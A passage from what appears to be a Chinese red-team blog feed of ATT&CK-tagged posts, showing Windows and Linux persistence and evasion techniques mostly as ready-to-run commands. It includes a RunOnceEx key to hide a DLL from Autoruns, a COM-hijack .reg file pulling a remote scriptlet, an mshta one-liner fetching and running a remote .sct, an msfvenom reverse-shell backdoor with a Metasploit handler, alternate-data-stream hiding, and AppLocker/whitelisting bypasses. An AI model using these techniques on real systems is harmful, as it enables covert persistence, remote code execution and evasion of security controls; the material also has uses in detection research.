        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RunOnceEx</title>
      <link href="/RunOnceEx.html"/>
      <url>/RunOnceEx.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/111B9E88668CCEEF802CA5E4F80BEF12.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/RunOnceEx1.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="使用RunOnceEx进行持久化-隐藏自Autoruns-exe"><a href="#使用RunOnceEx进行持久化-隐藏自Autoruns-exe" class="headerlink" title="使用RunOnceEx进行持久化 - 隐藏自Autoruns.exe"></a>使用RunOnceEx进行持久化 - 隐藏自Autoruns.exe</h2><p>1.发现一种技术来执行DLL文件，而不会在登录时被autoruns.exe检测到。<br> 需要管理员权限，不属于userland。</p><p> 运行这个漏洞</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\<span class="number">0001</span>\Depend /v <span class="number">1</span> /d <span class="string">&quot;C:\Users\demon\mbox.dll&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1521729671229.jpg" alt="enter description here"></p><p>2.mbox.dll将在下次登录时启动。或者你可以运行这个命令来触发执行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runonce /Explorer </span><br></pre></td></tr></table></figure><p>链接(link)：<a href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/">https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/</a><br><a href="https://support.microsoft.com/en-us/help/310593/description-of-the-runonceex-registry-key">https://support.microsoft.com/en-us/help/310593/description-of-the-runonceex-registry-key</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winlogon_regedit</title>
      <link href="/winlogon-regedit.html"/>
      <url>/winlogon-regedit.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/winlogon1.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft组件对象模型（COM）是Windows内的一个系统，用于通过操作系统实现软件组件之间的交互。</span><br><span class="line"><span class="number">1</span>攻击者可以使用这个系统插入恶意代码，通过劫持COM引用和关系来代替合法的软件来执行持久化。</span><br><span class="line">劫持COM对象需要在Windows注册表中进行更改，以将引用替换为可能导致该组件在执行时无法工作</span><br><span class="line">的合法系统组件。当系统组件通过正常的系统操作执行时，攻击者的代码将被执行。<span class="number">2</span> 攻击者很可能劫</span><br><span class="line">持足够频繁使用的对象来保持一致的持久性水平，但不可能在系统内破坏明显的功能，以避免可能导致</span><br><span class="line">检测的系统不稳定。</span><br></pre></td></tr></table></figure><h2 id="winlogon-reg"><a href="#winlogon-reg" class="headerlink" title="winlogon.reg"></a>winlogon.reg</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]</span></span><br><span class="line">@=<span class="string">&quot;AtomicRedTeam&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00\CLSID]</span></span><br><span class="line">@=<span class="string">&quot;&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]</span></span><br><span class="line">@=<span class="string">&quot;AtomicRedTeam&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]</span></span><br><span class="line">@=<span class="string">&quot;&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;]</span></span><br><span class="line">@=<span class="string">&quot;AtomicRedTeam&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\InprocServer32]</span></span><br><span class="line">@=<span class="string">&quot;C:\\WINDOWS\\system32\\scrobj.dll&quot;</span></span><br><span class="line"><span class="string">&quot;ThreadingModel&quot;</span>=<span class="string">&quot;Apartment&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\ProgID]</span></span><br><span class="line">@=<span class="string">&quot;AtomicRedTeam.1.00&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\ScriptletURL]</span></span><br><span class="line">@=<span class="string">&quot;https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\VersionIndependentProgID]</span></span><br><span class="line">@=<span class="string">&quot;AtomicRedTeam&quot;</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;06DA0625-9701-43DA-BFD7-FBEEA2180A1E&#125;]</span></span><br><span class="line"><span class="selector-attr">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;06DA0625-9701-43DA-BFD7-FBEEA2180A1E&#125;\TreatAs]</span></span><br><span class="line">@=<span class="string">&quot;&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1518437671161.jpg" alt="enter description here"><br><a href="https://twitter.com/subTee/status/962767403464577024">https://twitter.com/subTee/status/962767403464577024</a><br><a href="https://attack.mitre.org/wiki/Technique/T1122">https://attack.mitre.org/wiki/Technique/T1122</a><br><a href="https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5">https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>secist_Apploacker_bypass</title>
      <link href="/secist-Apploacker-bypass.html"/>
      <url>/secist-Apploacker-bypass.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180131_223511.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/secist_attack.mp4'    frameborder="0"     allowfullscreen></iframe><p>Github :<a href="https://github.com/demonsec666/Secist_Applocker">https://github.com/demonsec666/Secist_Applocker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-c, --csc:            &lt;path&gt;    Example:  Secist_Attack.exe -c |or  --csc C:\Users\demon\secist.cs |and run secist.exe</span><br><span class="line">-C, --cscript:        &lt;path&gt;    Example:  Secist_Attack.exe -C |or  --cscript  C:\Users\demon\Payload\secist.txt</span><br><span class="line">-m, --msbuild:        &lt;path&gt;    Example:  Secist_Attack.exe -m |or  --msbuild  C:\Users\demon\Payload\secist.csproj</span><br><span class="line">-i, --cl_invocation:  &lt;Command&gt; Example:  Secist_Attack.exe -i |or  --cl_invocation  calc.exe</span><br><span class="line">                                                                  Secist_Attack.exe -i &quot;powershell.exe  calc&quot;</span><br><span class="line">-p, --pcalua:         &lt;APP&gt;     Example:  Secist_Attack.exe -p |or  --pcalua  calc.exe</span><br><span class="line">-l, --control:        &lt;DLL&gt;     Example:  Secist_Attack.exe -l |or  --control C:\Users\demon\example\runcalc.dll</span><br><span class="line">-A, --Applocker:      &lt;shell&gt;   Example:  Secist_Attack.exe -A |or  --Applocker</span><br><span class="line">-h, --help:           &lt;help&gt;    Example:  Secist_Attack.exe -h |or  --help     &lt;show help&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410172598.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410332606.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410192976.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410258909.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vegile_Linux_Backdoor</title>
      <link href="/Vegile-Linux-Backdoor.html"/>
      <url>/Vegile-Linux-Backdoor.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3A4BDF482B386E4C1B18FB9DA91E478A.png" alt="enter description here"></p><span id="more"></span><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Vegile_Linux_Backdoor1.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/Screetsec/Vegile.git</span></span><br><span class="line">cd Vegile</span><br><span class="line">chmod +x Vegile</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444135450.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="Vegile帮助参数"><a href="#Vegile帮助参数" class="headerlink" title="Vegile帮助参数"></a>Vegile帮助参数</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vegile -<span class="selector-tag">i</span> / <span class="attr">--inject</span> <span class="selector-attr">[backdoor/rootkit]</span>  (注入)</span><br><span class="line">Vegile -u / <span class="attr">--unlimited</span> <span class="selector-attr">[backdoor/rootkit]</span> （无数次）</span><br><span class="line">Vegile -h / <span class="attr">--help</span></span><br></pre></td></tr></table></figure><h2 id="1-首先生成linux-木马"><a href="#1-首先生成linux-木马" class="headerlink" title="1.首先生成linux 木马"></a>1.首先生成linux 木马</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x86 <span class="attr">--platform</span> linux -<span class="selector-tag">p</span> linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -<span class="selector-tag">b</span> <span class="string">&quot;\x00&quot;</span> -f elf -o NAME_BACKDOOR</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444270799.jpg" alt="enter description here"></p><h2 id="2-建立监听"><a href="#2-建立监听" class="headerlink" title="2.建立监听"></a>2.建立监听</h2><p>handler.rc</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD linux/x86/shell/reverse_tcp</span><br><span class="line">set LHOST  <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444382477.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r handler<span class="selector-class">.rc</span> </span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516445509621.jpg" alt="enter description here"><br>  得到一次会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516445482085.jpg" alt="enter description here"></p><h2 id="得到会话"><a href="#得到会话" class="headerlink" title="得到会话"></a>得到会话</h2><p>并无限制的发送会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516445549295.jpg" alt="enter description here"><br>包括把整个文件夹删除 还在 无限制的发送会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516444498027.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Image_File_Execution_Options_cmd</title>
      <link href="/Image-File-Execution-Options-cmd.html"/>
      <url>/Image-File-Execution-Options-cmd.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Image_File_Execution_Options_cmd.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-uses-image-file.html?utm_campaign=crowdfire&utm_content=crowdfire&utm_medium=social&utm_source=twitter%232362224631-tw%231515608604431">https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-uses-image-file.html?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter%232362224631-tw%231515608604431</a><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516280301173.jpg" alt="enter description here"><br>&nbsp;</p><p>恶意代码中，批量的程序，  启动时 启动 svchost.exe<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516280341723.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mshta_RegSvcsRegAsmBypass</title>
      <link href="/mshta-RegSvcsRegAsmBypass.html"/>
      <url>/mshta-RegSvcsRegAsmBypass.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7fd532a8d32ff025ea824eeaa3e3d9b7.jpg" alt="enter description here"></p><span id="more"></span><h2 id="regsvcs-exe"><a href="#regsvcs-exe" class="headerlink" title="regsvcs.exe"></a>regsvcs.exe</h2><p>demon.ps1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$key = &#x27;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq</span><br><span class="line">/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbi</span><br><span class="line">x8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLi</span><br><span class="line">cweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7Fbd</span><br><span class="line">gpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/t</span><br><span class="line">qcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL</span><br><span class="line">6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk RegSvcsRegAsmBypass.cs</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll </span><br></pre></td></tr></table></figure><p>Github : <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a></p><p>RegSvcsRegAsmBypass.cs</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.EnterpriseServices;</span><br><span class="line">using System<span class="selector-class">.Runtime</span>.InteropServices;</span><br><span class="line">namespace regsvcser</span><br><span class="line">&#123; </span><br><span class="line">    public class Bypass : ServicedComponent</span><br><span class="line">    &#123;</span><br><span class="line">        public <span class="built_in">Bypass</span>() &#123; Console<span class="selector-class">.WriteLine</span>(<span class="string">&quot;I am a basic COM Object&quot;</span>); &#125;</span><br><span class="line"><span class="selector-attr">[ComRegisterFunction]</span> <span class="comment">//This executes if registration is successful</span></span><br><span class="line">public static void RegisterClass ( string key )</span><br><span class="line">&#123;</span><br><span class="line">System<span class="selector-class">.Diagnostics</span><span class="selector-class">.Process</span><span class="selector-class">.Start</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[ComUnregisterFunction]</span> <span class="comment">//This executes if registration fails</span></span><br><span class="line">public static void UnRegisterClass ( string key )</span><br><span class="line">&#123;</span><br><span class="line">System<span class="selector-class">.Diagnostics</span><span class="selector-class">.Process</span><span class="selector-class">.Start</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1516196533988.jpg" alt="enter description here"></p><h2 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta<span class="selector-class">.exe</span> javascript:a=<span class="built_in">GetObject</span>(<span class="string">&quot;script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct&quot;</span>)<span class="selector-class">.Exec</span>();<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/61EF8F4066E2C47D823299E7D9B7C121.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DB6212DEA5763595C96DB3BE85ABD29A.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>维权访问-ADS数据流</title>
      <link href="/APT.html"/>
      <url>/APT.html</url>
      
        <content type="html"><![CDATA[<h2 id="TeamViewer13"><a href="#TeamViewer13" class="headerlink" title="TeamViewer13"></a>TeamViewer13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C :\&gt;type :\temp\helloworld.hta &gt;&quot;C :\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta&quot;</span><br><span class="line">C :\&gt;mshta&quot;c :\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F2ABBAF5D93F6A45A6F005F907DFC77D.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_2229.JPG" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_2231.JPG" alt="enter description here"></p><h2 id="2-PHP"><a href="#2-PHP" class="headerlink" title="2.PHP"></a>2.PHP</h2><p>未寄宿 可以执行<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3ADCD300BE41699E206A58A27C3E5346.jpg" alt="enter description here"></p><p>删除文件<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7A430BB5C008502F29CA155414350C39.jpg" alt="enter description here"></p><p>删除文件—-寄宿数据流成功，并可以运行<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/FF6700C8B27E0C50A1DE7BFCC9D92867.jpg" alt="enter description here"></p><h2 id="3-Control"><a href="#3-Control" class="headerlink" title="3.Control"></a>3.Control</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0B832B73B79537BE95569BD0AFC2C61A.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DT7xuuMXcAESY2i.jpg" alt="enter description here"></p><p>链接资料：<a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></p><p><a href="https://twitter.com/bohops/status/954466315913310209">https://twitter.com/bohops/status/954466315913310209</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Subtee_AllTheThings</title>
      <link href="/Subtee-AllTheThings.html"/>
      <url>/Subtee-AllTheThings.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3F0D6AE9EBB9862FD2C7093C72B71FB0.png" alt="enter description here"></p><!--more---><p>Subtee的项目我已经上传了我的GitHub了。<br><a href="https://github.com/demonsec666/Subtee_AllTheThings">https://github.com/demonsec666/Subtee_AllTheThings</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/EAD95DD2-983D-414E-9001-A437C9FF6E4A.png" alt="enter description here"></p><p>Includes 5 Known Application Whitelisting Bypass Techniques in One File.</p><h3 id="1-InstallUtil-exe"><a href="#1-InstallUtil-exe" class="headerlink" title="1. InstallUtil.exe"></a>1. InstallUtil.exe</h3><h3 id="2-Regsvcs-exe"><a href="#2-Regsvcs-exe" class="headerlink" title="2. Regsvcs.exe"></a>2. Regsvcs.exe</h3><h3 id="3-Regasm-exe"><a href="#3-Regasm-exe" class="headerlink" title="3. Regasm.exe"></a>3. Regasm.exe</h3><h2 id="4-regsvr32-exe"><a href="#4-regsvr32-exe" class="headerlink" title="4. regsvr32.exe"></a>4. regsvr32.exe</h2><h3 id="5-rundll32-exe"><a href="#5-rundll32-exe" class="headerlink" title="5. rundll32.exe"></a>5. rundll32.exe</h3><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage:"></a>Usage:</h2><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U AllTheThings.dll</p><p>x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U AllTheThings.dll</p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll</p><p>x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll</p><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe &#x2F;U AllTheThings.dll</p><p>x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe &#x2F;U AllTheThings.dll</p><h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p>regsvr32 &#x2F;s  &#x2F;u AllTheThings.dll –&gt;Calls DllUnregisterServer</p><p>regsvr32 &#x2F;s AllTheThings.dll –&gt; Calls DllRegisterServer</p><h2 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h2><p>rundll32 AllTheThings.dll,EntryPoint</p><hr>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.NET_CSC_calc</title>
      <link href="/NET-CS-calc.html"/>
      <url>/NET-CS-calc.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/74AECD274FD87CA84354DE01CC5BCFB5.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Net_CSC_calc.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\csc<span class="selector-class">.exe</span> demon.cs</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515495219353.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace HelloWorld</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void <span class="built_in">Main</span>(string<span class="selector-attr">[]</span> args)</span><br><span class="line">        &#123;</span><br><span class="line">         System<span class="selector-class">.Diagnostics</span><span class="selector-class">.Process</span><span class="selector-class">.Start</span>(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">        &#125;</span><br><span class="line">    